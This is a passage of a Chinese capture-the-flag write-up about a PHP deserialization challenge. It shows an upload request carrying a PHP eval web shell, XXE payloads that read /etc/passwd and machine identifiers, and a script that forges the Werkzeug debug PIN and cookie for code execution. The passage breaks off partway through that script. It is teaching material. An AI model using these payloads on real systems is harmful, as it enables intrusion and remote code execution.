+------WebKitFormBoundarymEq0o60RkRmbFHie
+Content-Disposition: form-data; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;
+
+123
+------WebKitFormBoundarymEq0o60RkRmbFHie
+Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;shell.php&#34;
+Content-Type: application/octet-stream
+
+&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;
+------WebKitFormBoundarymEq0o60RkRmbFHie--
+</code></pre></td></tr></table>
+</div>
+</div><p>发包后得到源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">)){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Session not started&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+    <span class="nv">$properties</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;properties&#39;</span><span class="p">];</span>
+    <span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+    <span class="nx">extract</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]));</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$properties</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$properties</span><span class="p">))){</span>
+        <span class="nv">$object</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$properties</span><span class="p">));</span>
+        <span class="nv">$object</span> <span class="o">-&gt;</span> <span class="na">sctf</span><span class="p">();</span>
+        <span class="k">exit</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$properties</span><span class="p">)){</span>
+        <span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$type</span><span class="p">(</span><span class="nv">$properties</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$properties</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$object</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:5000/&#39;</span><span class="o">.</span><span class="nv">$properties</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">echo</span> <span class="s2">&#34;this is the object: </span><span class="si">$object</span><span class="s2"> &lt;br&gt;&#34;</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>看到http://127.0.0.1:5000/条件反射了，国赛刚出了这种</p>
+<p>先看前面，利用extract 变量覆盖掉 type 和 properties，完成原生类反序列化</p>
+<p>用SimpleXMLElement进行文件读取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;SimpleXMLElement&#39;</span><span class="p">;</span>
+<span class="nv">$evilxml</span> <span class="o">=</span> <span class="s1">&#39;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#39;</span><span class="p">;</span>
+<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;properties&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$evilxml</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">),</span><span class="s1">&#39;type&#39;</span><span class="o">=&gt;</span><span class="nv">$class</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20230619130412633.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619130412633"
+	
+	
+></p>
+<p>读/app/app.py，看到这个我只能说——典！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s1">&#39;Hello World!&#39;</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="n">q</span>	
+</code></pre></td></tr></table>
+</div>
+</div><p>开了debug，两条路，一个覆盖一个算pin</p>
+<p>这里注意到，会调用任意类的call方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$properties</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$properties</span><span class="p">))){</span>
+  <span class="nv">$object</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$properties</span><span class="p">));</span>
+  <span class="nv">$object</span> <span class="o">-&gt;</span> <span class="na">sctf</span><span class="p">();</span>
+  <span class="k">exit</span><span class="p">();</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>覆盖暂时没找到原生类的call方法可以覆盖写文件的，而有个原生类的call是经常用：<code>SoapClient</code></p>
+<p>可以用他的ssrf和crlf打组合拳，这样我们就可以把cookie塞入</p>
+<p>本地测试了下确实可以的crlf</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619131218158.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619131218158"
+	
+	
+></p>
+<p>接下里就是伪造cookie了本地抓包看到cookie的格式</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619131401588.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619131401588"
+	
+	
+></p>
+<p>代码执行的包</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619131437325.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619131437325"
+	
+	
+></p>
+<p>有三个注意点</p>
+<ul>
+<li>secret</li>
+<li>cookiename</li>
+<li>签名</li>
+</ul>
+<p>时间戳不影响使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">__wzddaa5b8d4dbffc03511fb=1687108743|3cf629099dfb
+</code></pre></td></tr></table>
+</div>
+</div><p>这里直接去翻flask的源码，这里他的cookie、pin的生成是利用了<code>werkzeug</code>，定位到代码里</p>
+<p>首先是pin码和cookiename的计算：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">get_pin_and_cookie_name</span><span class="p">(</span>
+    <span class="n">app</span><span class="p">:</span> <span class="n">WSGIApplication</span><span class="p">,</span>
+<span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]</span> <span class="o">|</span> <span class="nb">tuple</span><span class="p">[</span><span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">]:</span>
+    <span class="n">pin</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;WERKZEUG_DEBUG_PIN&#34;</span><span class="p">)</span>
+    <span class="n">rv</span> <span class="o">=</span> <span class="kc">None</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+
+    <span class="k">if</span> <span class="n">pin</span> <span class="o">==</span> <span class="s2">&#34;off&#34;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
+
+    <span class="k">if</span> <span class="n">pin</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">pin</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">isdecimal</span><span class="p">():</span>
+        <span class="k">if</span> <span class="s2">&#34;-&#34;</span> <span class="ow">in</span> <span class="n">pin</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="n">pin</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">num</span> <span class="o">=</span> <span class="n">pin</span>
+
+    <span class="n">modname</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s2">&#34;__module__&#34;</span><span class="p">,</span> <span class="n">t</span><span class="o">.</span><span class="n">cast</span><span class="p">(</span><span class="nb">object</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__module__</span><span class="p">)</span>
+    <span class="n">username</span><span class="p">:</span> <span class="nb">str</span> <span class="o">|</span> <span class="kc">None</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="n">getpass</span><span class="o">.</span><span class="n">getuser</span><span class="p">()</span>
+    <span class="k">except</span> <span class="p">(</span><span class="ne">ImportError</span><span class="p">,</span> <span class="ne">KeyError</span><span class="p">):</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="kc">None</span>
+
+    <span class="n">mod</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">modname</span><span class="p">)</span>
+
+    <span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">username</span><span class="p">,</span>
+        <span class="n">modname</span><span class="p">,</span>
+        <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s2">&#34;__name__&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">app</span><span class="p">)</span><span class="o">.</span><span class="vm">__name__</span><span class="p">),</span>
+        <span class="nb">getattr</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="s2">&#34;__file__&#34;</span><span class="p">,</span> <span class="kc">None</span><span class="p">),</span>
+    <span class="p">]</span>
+
+    <span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">()),</span> <span class="n">get_machine_id</span><span class="p">()]</span>
+
+    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+            <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+        <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cookiesalt&#34;</span><span class="p">)</span>
+
+    <span class="n">cookie_name</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;__wzd</span><span class="si">{</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span>
+
+    <span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;pinsalt&#34;</span><span class="p">)</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span><span class="si">:</span><span class="s2">09d</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">[:</span><span class="mi">9</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">rv</span> <span class="o">=</span> <span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
+                    <span class="n">num</span><span class="p">[</span><span class="n">x</span> <span class="p">:</span> <span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
+                    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">)</span>
+                <span class="p">)</span>
+                <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+    <span class="k">return</span> <span class="n">rv</span><span class="p">,</span> <span class="n">cookie_name</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>得到了pin以后可以计算cookie，代码简化一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">hash_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s2"> added salt&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;replace&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">12</span><span class="p">]</span>
+
+<span class="o">...</span>
+<span class="o">...</span>
+<span class="k">if</span> <span class="n">auth</span><span class="p">:</span>
+  <span class="n">rv</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">pin_cookie_name</span><span class="p">,</span>
+    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">hash_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+    <span class="n">httponly</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+    <span class="n">samesite</span><span class="o">=</span><span class="s2">&#34;Strict&#34;</span><span class="p">,</span>
+    <span class="n">secure</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">is_secure</span><span class="p">,</span>
+  <span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样就串联起来了，这里有点小坑点，就是phthon库的位置得确定一下</p>
+<p>然后读文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">a:2:{s:10:&#34;properties&#34;;a:2:{i:0;s:114:&#34;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &#34;file:///sys/class/net/eth0/address&#34;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#34;;i:1;s:1:&#34;2&#34;;}s:4:&#34;type&#34;;s:16:&#34;SimpleXMLElement&#34;;}
+02:42:ac:13:00:02 -&gt; 2485378023426
+
+a:2:{s:10:&#34;properties&#34;;a:2:{i:0;s:118:&#34;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &#34;file:///proc/sys/kernel/random/boot_id&#34;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#34;;i:1;s:1:&#34;2&#34;;}s:4:&#34;type&#34;;s:16:&#34;SimpleXMLElement&#34;;}
+349b3354-f67f-4438-b395-4fbc01171fdd
+
+a:2:{s:10:&#34;properties&#34;;a:2:{i:0;s:104:&#34;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &#34;file:///proc/self/cgroup&#34;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#34;;i:1;s:1:&#34;2&#34;;}s:4:&#34;type&#34;;s:16:&#34;SimpleXMLElement&#34;;}
+96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687
+</code></pre></td></tr></table>
+</div>
+</div><p>整合一下脚本就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#sha1</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;app&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;/usr/lib/python3.8/site-packages/flask/app.py&#39;</span>
+<span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;2485378023426&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&#39;</span>
+<span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cookiesalt&#34;</span><span class="p">)</span>
+
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;__wzd</span><span class="si">{</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="kc">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="s2">&#34;-&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
+                <span class="n">num</span><span class="p">[</span><span class="n">x</span> <span class="p">:</span> <span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
+                <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">)</span>
+            <span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
